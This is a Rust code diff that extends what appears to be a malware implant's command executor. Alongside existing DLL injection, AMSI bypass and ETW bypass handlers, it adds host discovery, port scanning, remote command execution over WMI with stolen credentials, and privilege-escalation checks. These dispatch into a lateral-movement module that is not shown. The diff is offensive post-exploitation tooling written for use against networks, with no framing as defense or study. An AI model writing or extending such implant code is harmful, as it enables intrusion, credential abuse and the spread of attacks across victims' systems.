@@ -244,6 +244,18 @@ pub enum CommandType {
 
     #[serde(rename = "etw_bypass")]
     EtwBypass,
+
+    #[serde(rename = "discover_hosts")]
+    DiscoverHosts,
+
+    #[serde(rename = "port_scan")]
+    PortScan { target: String, ports: Option<Vec<u16>> },
+
+    #[serde(rename = "wmi_exec")]
+    WmiExec { target: String, username: String, password: String, command: String },
+
+    #[serde(rename = "privesc_check")]
+    PrivescCheck,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -310,6 +322,10 @@ impl Executor {
             CommandType::InjectDll { pid, dll_path } => Self::inject_dll(*pid, dll_path).await,
             CommandType::AmsiBypass => Self::amsi_bypass().await,
             CommandType::EtwBypass => Self::etw_bypass().await,
+            CommandType::DiscoverHosts => Self::discover_hosts().await,
+            CommandType::PortScan { target, ports } => Self::port_scan(target, ports.as_deref()).await,
+            CommandType::WmiExec { target, username, password, command } => Self::wmi_exec(target, username, password, command).await,
+            CommandType::PrivescCheck => Self::privesc_check().await,
         };
 
         result.execution_time_ms = start.elapsed().as_millis();
@@ -1229,6 +1245,34 @@ impl Executor {
             Ok(msg) => CommandResult { command_type: "etw_bypass".into(), status: "success".into(), output: msg, error: None, execution_time_ms: 0 },
             Err(e) => CommandResult { command_type: "etw_bypass".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
         }
+    }
+
+    async fn discover_hosts() -> CommandResult {
+        match crate::lateral::LateralMovement::discover_hosts() {
+            Ok(output) => CommandResult { command_type: "discover_hosts".into(), status: "success".into(), output, error: None, execution_time_ms: 0 },
+            Err(e) => CommandResult { command_type: "discover_hosts".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
+        }
+    }
+
+    async fn port_scan(target: &str, ports: Option<&[u16]>) -> CommandResult {
+        let scan_ports = ports.map(|p| p.to_vec())
+            .unwrap_or_else(|| crate::lateral::LateralMovement::common_ports());
+        match crate::lateral::LateralMovement::port_scan(target, &scan_ports).await {
+            Ok(output) => CommandResult { command_type: "port_scan".into(), status: "success".into(), output, error: None, execution_time_ms: 0 },
+            Err(e) => CommandResult { command_type: "port_scan".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
+        }
+    }
+
+    async fn wmi_exec(target: &str, username: &str, password: &str, command: &str) -> CommandResult {
+        match crate::lateral::LateralMovement::wmi_exec(target, username, password, command) {
+            Ok(output) => CommandResult { command_type: "wmi_exec".into(), status: "success".into(), output, error: None, execution_time_ms: 0 },
+            Err(e) => CommandResult { command_type: "wmi_exec".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
+        }
+    }
+
+    async fn privesc_check() -> CommandResult {
+        let output = crate::lateral::PrivilegeEscalation::check();
+        CommandResult { command_type: "privesc_check".into(), status: "success".into(), output, error: None, execution_time_ms: 0 }
     }
 }
 
